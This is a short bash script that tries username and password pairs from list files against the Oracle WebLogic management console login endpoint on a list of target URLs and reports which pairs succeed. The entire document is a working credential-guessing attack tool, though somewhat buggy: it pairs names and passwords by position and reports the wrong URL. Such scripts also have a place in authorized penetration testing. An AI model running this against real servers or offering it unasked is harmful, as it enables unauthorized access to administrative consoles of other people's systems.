#!/bin/bash

# quick and dirty check for common user:password combinations
# used to logon to Oracle Weglobic Application Server 
# management console

# list of usernames
username=($(cat usernames.lst))

# list of passwords
password=($(cat passwords.lst))

# list of urls in the form of "http[s]://host:[port]"
url=($(cat urls.lst))

# end of configuration part
echo "[!] Start!"
uri="/console/j_security_check"
for ((h=0; h < ${#url[@]}; h++)) do
    for ((i=0; i < ${#username[@]}; i++)) do
        check=$(curl -so - --data "j_username=${username[$i]}&j_password=${password[$i]}&j_character_encoding=UTF-8" ${url[$h]}${uri} | grep "LoginForm.jsp")
        if [ -z "$check" ]; then
		echo "[*] Found match: ${username[$i]}:${password[$i]} for ${url}"
        fi
    done
done
echo "[!] Done."